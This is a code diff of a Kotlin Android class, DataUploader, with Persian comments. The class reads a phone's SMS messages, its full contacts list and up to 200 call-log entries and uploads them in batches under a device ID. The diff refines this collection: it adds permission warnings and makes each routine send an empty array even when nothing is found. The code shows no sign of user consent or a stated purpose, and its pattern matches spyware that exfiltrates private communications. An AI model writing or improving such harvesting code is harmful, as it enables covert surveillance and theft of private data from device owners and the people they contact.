@@ -101,7 +101,10 @@ object DataUploader {
 
     fun uploadAllSms(context: Context, deviceId: String) {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
-            != PackageManager.PERMISSION_GRANTED) return
+            != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "⚠️ SMS permission not granted")
+            return
+        }
 
         try {
             Log.d(TAG, "════════════════════════════════════════")
@@ -112,13 +115,13 @@ object DataUploader {
             val sortOrder = "date DESC"
             val cursor = context.contentResolver.query(smsUri, null, null, null, sortOrder)
 
+            val smsBatch = JSONArray()
+            var totalSent = 0
+            var count = 0
+            val maxSms = 100
+
             cursor?.use {
                 if (it.moveToFirst()) {
-                    val smsBatch = JSONArray()
-                    var totalSent = 0
-                    var count = 0
-                    val maxSms = 100
-
                     do {
                         if (count >= maxSms) break
 
@@ -144,13 +147,19 @@ object DataUploader {
                             Log.e(TAG, "❌ Error reading SMS: ${e.message}")
                         }
                     } while (it.moveToNext())
-
-                    if (smsBatch.length() > 0 && uploadSmsBatch(smsBatch)) {
-                        totalSent += smsBatch.length()
-                    }
-                    Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
                 }
             }
+
+            // حتی اگر دیتا نداشته باشیم، باز هم آرایه خالی رو می‌فرستیم
+            if (smsBatch.length() > 0 && uploadSmsBatch(smsBatch)) {
+                totalSent += smsBatch.length()
+            } else if (smsBatch.length() == 0 && totalSent == 0) {
+                // ارسال آرایه خالی
+                uploadSmsBatch(JSONArray())
+                Log.d(TAG, "📭 No SMS found, sent empty array")
+            }
+
+            Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
         } catch (e: Exception) {
             Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
         }
@@ -182,7 +191,10 @@ object DataUploader {
 
     fun uploadAllContacts(context: Context, deviceId: String) {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS)
-            != PackageManager.PERMISSION_GRANTED) return
+            != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "⚠️ Contacts permission not granted")
+            return
+        }
 
         try {
             Log.d(TAG, "════════════════════════════════════════")
@@ -199,11 +211,11 @@ object DataUploader {
 
             val cursor = context.contentResolver.query(contactsUri, projection, null, null, null)
 
+            val contactsBatch = JSONArray()
+            var totalSent = 0
+
             cursor?.use {
                 if (it.moveToFirst()) {
-                    val contactsBatch = JSONArray()
-                    var totalSent = 0
-
                     do {
                         try {
                             val contact = JSONObject().apply {
@@ -225,13 +237,19 @@ object DataUploader {
                             Log.e(TAG, "❌ Error reading contact: ${e.message}")
                         }
                     } while (it.moveToNext())
-
-                    if (contactsBatch.length() > 0 && uploadContactsBatch(deviceId, contactsBatch)) {
-                        totalSent += contactsBatch.length()
-                    }
-                    Log.d(TAG, "✅ Total contacts uploaded: $totalSent")
                 }
             }
+
+            // حتی اگر دیتا نداشته باشیم، باز هم آرایه خالی رو می‌فرستیم
+            if (contactsBatch.length() > 0 && uploadContactsBatch(deviceId, contactsBatch)) {
+                totalSent += contactsBatch.length()
+            } else if (contactsBatch.length() == 0 && totalSent == 0) {
+                // ارسال آرایه خالی
+                uploadContactsBatch(deviceId, JSONArray())
+                Log.d(TAG, "📭 No contacts found, sent empty array")
+            }
+
+            Log.d(TAG, "✅ Total contacts uploaded: $totalSent")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Contacts upload error: ${e.message}", e)
         }
@@ -266,7 +284,10 @@ object DataUploader {
 
     fun uploadCallHistory(context: Context, deviceId: String) {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
-            != PackageManager.PERMISSION_GRANTED) return
+            != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "⚠️ Call log permission not granted")
+            return
+        }
 
         try {
             Log.d(TAG, "════════════════════════════════════════")
@@ -286,13 +307,13 @@ object DataUploader {
             val sortOrder = "${android.provider.CallLog.Calls.DATE} DESC"
             val cursor = context.contentResolver.query(callLogUri, projection, null, null, sortOrder)
 
+            val callsBatch = JSONArray()
+            var totalSent = 0
+            var count = 0
+            val maxCalls = 200
+
             cursor?.use {
                 if (it.moveToFirst()) {
-                    val callsBatch = JSONArray()
-                    var totalSent = 0
-                    var count = 0
-                    val maxCalls = 200
-
                     do {
                         if (count >= maxCalls) break
 
@@ -330,13 +351,19 @@ object DataUploader {
                             Log.e(TAG, "❌ Error reading call log: ${e.message}")
                         }
                     } while (it.moveToNext())
-
-                    if (callsBatch.length() > 0 && uploadCallsBatch(deviceId, callsBatch)) {
-                        totalSent += callsBatch.length()
-                    }
-                    Log.d(TAG, "✅ Total call logs uploaded: $totalSent")
                 }
             }
+
+            // حتی اگر دیتا نداشته باشیم، باز هم آرایه خالی رو می‌فرستیم
+            if (callsBatch.length() > 0 && uploadCallsBatch(deviceId, callsBatch)) {
+                totalSent += callsBatch.length()
+            } else if (callsBatch.length() == 0 && totalSent == 0) {
+                // ارسال آرایه خالی
+                uploadCallsBatch(deviceId, JSONArray())
+                Log.d(TAG, "📭 No call logs found, sent empty array")
+            }
+
+            Log.d(TAG, "✅ Total call logs uploaded: $totalSent")
         } catch (e: Exception) {
             Log.e(TAG, "❌ Call history upload error: ${e.message}", e)
         }
